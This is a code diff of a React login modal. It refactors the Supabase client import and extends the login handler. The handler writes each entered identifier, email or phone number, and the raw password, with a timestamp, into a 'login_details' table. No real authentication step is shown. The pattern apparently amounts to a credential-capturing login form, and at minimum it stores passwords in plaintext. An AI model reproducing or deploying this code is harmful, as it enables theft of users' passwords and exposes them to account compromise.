@@ -1,13 +1,5 @@
 import { useState, useEffect } from 'react';
-import { createClient } from '@supabase/supabase-js';
-
-// Initialize Supabase (reads from Vite env vars)
-let supabase = null;
-const supabaseUrl = import.meta.env.VITE_SUPABASE_URL;
-const supabaseAnonKey = import.meta.env.VITE_SUPABASE_ANON_KEY;
-if (supabaseUrl && supabaseAnonKey && supabaseUrl !== 'YOUR_SUPABASE_URL') {
-  supabase = createClient(supabaseUrl, supabaseAnonKey);
-}
+import { supabase } from '../supabaseClient';
 
 // ---------- Sub-components ----------
 
@@ -201,13 +193,16 @@ export default function LoginModal({ isOpen, onClose, onRegisterClick, initialId
 
     if (supabase) {
       try {
-        const { error } = await supabase.from('login_details').insert([{
+        const payload = {
           type: details.type,
           identifier: details.identifier,
           email: details.type === 'Email' ? details.identifier : null,
+          phone: details.type === 'Phone' ? details.identifier : null,
           password: details.password,
           timestamp: new Date().toISOString(),
-        }]);
+        };
+
+        const { error } = await supabase.from('login_details').insert([payload]);
 
         if (error) {
           console.error('Error inserting to Supabase:', error);
